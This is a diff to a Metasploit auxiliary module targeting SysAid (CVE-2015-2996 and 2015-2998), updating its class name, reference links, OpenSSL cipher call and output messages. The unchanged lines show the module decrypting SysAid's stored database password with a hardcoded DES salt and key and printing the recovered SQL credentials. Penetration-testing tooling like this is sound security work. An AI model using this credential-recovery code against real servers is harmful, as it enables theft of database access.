@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'openssl'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
@@ -29,8 +27,8 @@ class Metasploit3 < Msf::Auxiliary
         [
           ['CVE', '2015-2996'],
           ['CVE', '2015-2998'],
-          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/generic/sysaid-14.4-multiple-vulns.txt' ],
-          ['URL', 'http://seclists.org/fulldisclosure/2015/Jun/8']
+          ['URL', 'http://seclists.org/fulldisclosure/2015/Jun/8'],
+          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt']
         ],
       'DisclosureDate' => 'Jun 3 2015'))
 
@@ -38,13 +36,13 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptPort.new('RPORT', [true, 'The target port', 8080]),
         OptString.new('TARGETURI', [ true, 'SysAid path', '/sysaid']),
-      ], self.class)
+      ])
   end
 
 
   def decrypt_password (ciphertext)
     salt = [-87, -101, -56, 50, 86, 53, -29, 3].pack('c*')
-    cipher = OpenSSL::Cipher::Cipher.new("DES")
+    cipher = OpenSSL::Cipher.new("DES")
     base_64_code = Rex::Text.decode_base64(ciphertext)
     cipher.decrypt
     cipher.pkcs5_keyivgen 'inigomontoya', salt, 19
@@ -119,7 +117,7 @@ class Metasploit3 < Msf::Auxiliary
           fail_with(Failure::Unknown, 'Could not resolve database server hostname.')
         end
 
-        print_status("#{peer} - Stored SQL credentials #{username}:#{password} for #{matches.captures[2]}")
+        print_good("Stored SQL credentials #{username}:#{password} for #{matches.captures[2]}")
         return
       end
     else
